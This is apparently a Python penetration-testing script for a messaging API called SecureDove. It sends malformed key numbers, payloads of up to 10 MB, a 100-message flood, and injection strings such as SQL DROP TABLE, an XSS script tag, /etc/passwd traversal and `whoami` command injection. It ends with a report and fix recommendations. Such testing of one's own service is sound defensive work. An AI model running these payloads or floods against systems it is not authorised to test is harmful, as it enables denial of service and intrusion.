#!/usr/bin/env python3
"""
SecureDove Message Validation Attack Script
Tests input validation vulnerabilities in the message endpoint.

VULNERABILITIES EXPLOITED:
1. No length limits on encrypted_msg_content (can send gigabytes)
2. No validation on content_key_number (negative, zero, huge numbers)
3. No rate limiting on message sending
4. No payload size validation
5. Integer overflow potential on content_key_number

Attack Vector:
POST /api/messages with malformed content_key_number and massive payloads
"""

import requests
import sys
import time
import json
from typing import Dict, List, Tuple

class MessageValidationAttacker:
    def __init__(self, base_url: str = "http://localhost:8000"):
        self.base_url = base_url.rstrip('/')
        self.api_url = f"{self.base_url}/api"
        self.session = requests.Session()
        self.token = None
        self.username = None
        self.test_conversation_id = None
        
    def register_and_login(self, username: str, password: str) -> bool:
        """Register and login user"""
        try:
            # Try registration
            payload = {
                "username": username,
                "password": password,
                "public_key": "test_public_key",
                "salt": "test_salt",
                "encrypted_private_key": "test_encrypted_private_key"
            }
            
            response = self.session.post(
                f"{self.api_url}/auth/register",
                json=payload,
                timeout=5
            )
            print(f"Registration response: {response.status_code} - {response.text}")
            
            # Try login regardless
            response = self.session.post(
                f"{self.api_url}/auth/login",
                json={"username": username, "password": password},
                timeout=5
            )
            print(f"Login response: {response.status_code} - {response.text}")
            
            if response.status_code == 200:
                data = response.json()
                self.token = data.get('token')
                self.username = username
                print(f"[+] Authenticated as: {username}")
                return True
            
            return False
        except Exception as e:
            print(f"[-] Authentication error: {e}")
            return False
    
    def create_test_conversation(self) -> bool:
        """Create a test conversation for message attacks"""
        try:
            self.test_conversation_id = f"test_msg_attack_{int(time.time())}"
            
            payload = {
                "conversation_entries": [{
                    "id": self.test_conversation_id,
                    "username": self.username,
                    "encrypted_content_key": "test_key",
                    "content_key_number": 1
                }]
            }
            
            response = self.session.post(
                f"{self.api_url}/conversations",
                json=payload,
                headers={"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"},
                timeout=5
            )
            
            if response.status_code in [200, 201]:
                print(f"[+] Created test conversation: {self.test_conversation_id}")
                return True
            
            print(f"[-] Failed to create conversation: {response.status_code}")
            return False
            
        except Exception as e:
            print(f"[-] Conversation creation error: {e}")
            return False
    
    def test_content_key_number_validation(self) -> List[Dict]:
        """Test content_key_number validation vulnerabilities"""
        print("\n" + "="*70)
        print("TESTING CONTENT_KEY_NUMBER VALIDATION")
        print("="*70)
        
        test_cases = [
            ("Negative number", -1),
            ("Zero", 0),
            ("Huge positive number", 999999999999999),
            ("Integer overflow attempt", 2**63),
            ("Negative overflow", -(2**63)),
            ("Float as integer", 1.5),  # Will be sent as JSON number
            ("String injection", "not_a_number"),
            ("SQL injection string", "1' OR '1'='1"),
            ("Null value", None),
            ("Boolean true", True),
            ("Boolean false", False),
        ]
        
        results = []
        for description, key_number in test_cases:
            print(f"\n[*] Testing: {description}")
            print(f"[*] content_key_number: {key_number} (type: {type(key_number).__name__})")
            
            try:
                payload = {
                    "conversation_id": self.test_conversation_id,
                    "content_key_number": key_number,
                    "encrypted_msg_content": f"Test message with key_number: {key_number}"
                }
                
                response = self.session.post(
                    f"{self.api_url}/messages",
                    json=payload,
                    headers={"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"},
                    timeout=10
                )
                
                if response.status_code in [200, 201]:
                    print(f"[!] VULNERABILITY: Accepted invalid content_key_number!")
                    print(f"[!] Response: {response.json()}")
                    vulnerable = True
                else:
                    print(f"[-] Correctly rejected (Status: {response.status_code})")
                    vulnerable = False
                
                results.append({
                    "test": description,
                    "value": str(key_number),
                    "vulnerable": vulnerable,
                    "status_code": response.status_code
                })
                
            except Exception as e:
                print(f"[-] Error: {e}")
                results.append({
                    "test": description,
                    "value": str(key_number),
                    "vulnerable": False,
                    "error": str(e)
                })
            
            time.sleep(0.3)
        
        return results
    
    def test_message_content_size(self) -> List[Dict]:
        """Test message content size limits (DoS potential)"""
        print("\n" + "="*70)
        print("TESTING MESSAGE CONTENT SIZE LIMITS (DoS)")
        print("="*70)
        
        test_cases = [
            ("1 KB message", 1024),
            ("10 KB message", 10 * 1024),
            ("100 KB message", 100 * 1024),
            ("1 MB message", 1024 * 1024),
            ("5 MB message", 5 * 1024 * 1024),
            ("10 MB message", 10 * 1024 * 1024),  # Should hit server limit
        ]
        
        results = []
        for description, size in test_cases:
            print(f"\n[*] Testing: {description} ({size:,} bytes)")
            
            try:
                # Create a large payload
                large_content = "A" * size
                
                payload = {
                    "conversation_id": self.test_conversation_id,
                    "content_key_number": 1,
                    "encrypted_msg_content": large_content
                }
                
                start_time = time.time()
                response = self.session.post(
                    f"{self.api_url}/messages",
                    json=payload,
                    headers={"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"},
                    timeout=30
                )
                duration = time.time() - start_time
                
                if response.status_code in [200, 201]:
                    print(f"[!] VULNERABILITY: Accepted {size:,} byte message!")
                    print(f"[!] Processing time: {duration:.2f}s")
                    vulnerable = True
                else:
                    print(f"[-] Rejected (Status: {response.status_code})")
                    vulnerable = False
                
                results.append({
                    "test": description,
                    "size_bytes": size,
                    "vulnerable": vulnerable,
                    "status_code": response.status_code,
                    "duration": f"{duration:.2f}s"
                })
                
            except requests.exceptions.Timeout:
                print(f"[!] TIMEOUT: Server took too long (DoS indicator)")
                results.append({
                    "test": description,
                    "size_bytes": size,
                    "vulnerable": True,
                    "error": "Timeout - DoS potential"
                })
            except Exception as e:
                print(f"[-] Error: {e}")
                results.append({
                    "test": description,
                    "size_bytes": size,
                    "vulnerable": False,
                    "error": str(e)
                })
            
            time.sleep(0.5)
        
        return results
    
    def test_special_content_injection(self) -> List[Dict]:
        """Test special characters and injection in message content"""
        print("\n" + "="*70)
        print("TESTING SPECIAL CONTENT INJECTION")
        print("="*70)
        
        test_cases = [
            ("Null bytes", "Message\x00with\x00null\x00bytes"),
            ("SQL injection", "'; DROP TABLE messages; --"),
            ("NoSQL injection", "{'$gt': ''}"),
            ("JSON injection", '{"injected": "data", "malicious": true}'),
            ("XML injection", "<message><injected>data</injected></message>"),
            ("Script tag", "<script>alert('XSS')</script>"),
            ("Unicode overflow", "ðŸš€" * 1000),
            ("Control characters", "\r\n\t\b\f\v"),
            ("Format string", "%s%s%s%s%n"),
            ("Path traversal", "../../../etc/passwd"),
            ("Backticks", "`whoami`"),
            ("Command injection", "; ls -la"),
            ("CRLF injection", "Line1\r\nInjected-Header: malicious\r\n\r\nBody"),
        ]
        
        results = []
        for description, content in test_cases:
            print(f"\n[*] Testing: {description}")
            
            try:
                payload = {
                    "conversation_id": self.test_conversation_id,
                    "content_key_number": 1,
                    "encrypted_msg_content": content
                }
                
                response = self.session.post(
                    f"{self.api_url}/messages",
                    json=payload,
                    headers={"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"},
                    timeout=10
                )
                
                if response.status_code in [200, 201]:
                    print(f"[!] VULNERABILITY: Accepted special content!")
                    vulnerable = True
                else:
                    print(f"[-] Rejected (Status: {response.status_code})")
                    vulnerable = False
                
                results.append({
                    "test": description,
                    "vulnerable": vulnerable,
                    "status_code": response.status_code
                })
                
            except Exception as e:
                print(f"[-] Error: {e}")
                results.append({
                    "test": description,
                    "vulnerable": False,
                    "error": str(e)
                })
            
            time.sleep(0.3)
        
        return results
    
    def test_message_flooding(self) -> Dict:
        """Test rate limiting on message sending (DoS)"""
        print("\n" + "="*70)
        print("TESTING MESSAGE FLOODING (Rate Limit Bypass)")
        print("="*70)
        
        num_messages = 100
        print(f"[*] Attempting to send {num_messages} messages rapidly...")
        
        successful = 0
        rate_limited = 0
        errors = 0
        
        start_time = time.time()
        
        for i in range(num_messages):
            try:
                payload = {
                    "conversation_id": self.test_conversation_id,
                    "content_key_number": 1,
                    "encrypted_msg_content": f"Flood message {i}"
                }
                
                response = self.session.post(
                    f"{self.api_url}/messages",
                    json=payload,
                    headers={"Authorization": f"Bearer {self.token}", "Content-Type": "application/json"},
                    timeout=5
                )
                
                if response.status_code in [200, 201]:
                    successful += 1
                elif response.status_code == 429:
                    rate_limited += 1
                else:
                    errors += 1
                
                if (i + 1) % 10 == 0:
                    print(f"[*] Progress: {i+1}/{num_messages} messages sent")
                
            except Exception as e:
                errors += 1
        
        duration = time.time() - start_time
        rate = successful / duration if duration > 0 else 0
        
        print(f"\n[*] Results:")
        print(f"    Successful: {successful}/{num_messages}")
        print(f"    Rate limited: {rate_limited}")
        print(f"    Errors: {errors}")
        print(f"    Duration: {duration:.2f}s")
        print(f"    Rate: {rate:.2f} messages/second")
        
        if successful > 50:
            print(f"[!] VULNERABILITY: No effective rate limiting on messages!")
            vulnerable = True
        else:
            print(f"[-] Rate limiting appears to be working")
            vulnerable = False
        
        return {
            "test": "Message flooding",
            "vulnerable": vulnerable,
            "successful": successful,
            "total": num_messages,
            "rate_limited": rate_limited,
            "duration": f"{duration:.2f}s",
            "rate": f"{rate:.2f} msg/s"
        }
    
    def generate_report(self, key_results: List[Dict], size_results: List[Dict], 
                       injection_results: List[Dict], flood_result: Dict):
        """Generate vulnerability report"""
        print("\n" + "="*70)
        print("MESSAGE VALIDATION VULNERABILITY REPORT")
        print("="*70)
        
        # Key number vulnerabilities
        key_vulns = [r for r in key_results if r.get('vulnerable')]
        print(f"\n[*] Content Key Number Validation:")
        print(f"    Tests: {len(key_results)}")
        print(f"    Vulnerabilities: {len(key_vulns)}")
        
        if key_vulns:
            print(f"\n[!] VULNERABLE KEY NUMBERS:")
            for v in key_vulns:
                print(f"    - {v['test']}: {v['value']}")
        
        # Size vulnerabilities
        size_vulns = [r for r in size_results if r.get('vulnerable')]
        print(f"\n[*] Message Size Validation:")
        print(f"    Tests: {len(size_results)}")
        print(f"    Vulnerabilities: {len(size_vulns)}")
        
        if size_vulns:
            print(f"\n[!] ACCEPTED LARGE MESSAGES:")
            for v in size_vulns:
                print(f"    - {v['test']}: {v['size_bytes']:,} bytes")
        
        # Injection vulnerabilities
        injection_vulns = [r for r in injection_results if r.get('vulnerable')]
        print(f"\n[*] Content Injection:")
        print(f"    Tests: {len(injection_results)}")
        print(f"    Vulnerabilities: {len(injection_vulns)}")
        
        if injection_vulns:
            print(f"\n[!] ACCEPTED SPECIAL CONTENT:")
            for v in injection_vulns:
                print(f"    - {v['test']}")
        
        # Flooding
        print(f"\n[*] Message Flooding:")
        if flood_result['vulnerable']:
            print(f"[!] VULNERABLE: {flood_result['successful']}/{flood_result['total']} messages sent")
            print(f"    Rate: {flood_result['rate']}")
        else:
            print(f"[-] Rate limiting appears effective")
        
        # Total
        total_vulns = len(key_vulns) + len(size_vulns) + len(injection_vulns)
        if flood_result['vulnerable']:
            total_vulns += 1
        
        print(f"\n{'='*70}")
        print(f"TOTAL VULNERABILITIES: {total_vulns}")
        print(f"{'='*70}")
        
        # Recommendations
        print("\n[*] RECOMMENDATIONS:")
        print("    1. Add strict validation for content_key_number:")
        print("       - Must be positive integer")
        print("       - Set maximum value (e.g., < 1,000,000)")
        print("       - Verify type is integer, not string/float/boolean")
        print("    2. Implement message size limits:")
        print("       - Max encrypted_msg_content: 100KB - 1MB")
        print("       - Reject oversized payloads early")
        print("    3. Add message-specific rate limiting:")
        print("       - Limit messages per conversation per minute")
        print("       - Implement account-level limits")
        print("    4. Sanitize and validate message content:")
        print("       - Strip null bytes and control characters")
        print("       - Validate content matches encryption format")
        print("    5. Add monitoring for unusual patterns:")
        print("       - Detect rapid message sending")
        print("       - Alert on oversized messages")
        
        # Save report
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        report_file = f"message_validation_report_{timestamp}.json"
        
        report_data = {
            "timestamp": timestamp,
            "target": self.api_url,
            "content_key_number_tests": key_results,
            "message_size_tests": size_results,
            "content_injection_tests": injection_results,
            "message_flooding_test": flood_result,
            "summary": {
                "total_tests": len(key_results) + len(size_results) + len(injection_results) + 1,
                "total_vulnerabilities": total_vulns
            }
        }
        
        try:
            with open(report_file, 'w') as f:
                json.dump(report_data, f, indent=2)
            print(f"\n[+] Report saved to: {report_file}")
        except Exception as e:
            print(f"\n[-] Could not save report: {e}")

def main():
    base_url = "http://localhost:8000"
    username = f"msg{int(time.time()) % 100000}"
    password = "TestPass123!"
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    
    print("="*70)
    print("SecureDove Message Validation Attack Script")
    print("="*70)
    print(f"Target: {base_url}")
    print(f"Test user: {username}")
    print("="*70)
    
    attacker = MessageValidationAttacker(base_url)
    
    # Setup
    print("\n[*] Setting up test environment...")
    if not attacker.register_and_login(username, password):
        print("[-] Authentication failed!")
        sys.exit(1)
    
    if not attacker.create_test_conversation():
        print("[-] Could not create test conversation!")
        sys.exit(1)
    
    # Run tests
    time.sleep(1)
    print("\n[*] Starting vulnerability tests...")
    
    key_results = attacker.test_content_key_number_validation()
    time.sleep(1)
    
    size_results = attacker.test_message_content_size()
    time.sleep(1)
    
    injection_results = attacker.test_special_content_injection()
    time.sleep(1)
    
    flood_result = attacker.test_message_flooding()
    
    # Report
    attacker.generate_report(key_results, size_results, injection_results, flood_result)
    
    print("\n[*] Testing complete!")

if __name__ == "__main__":
    main()
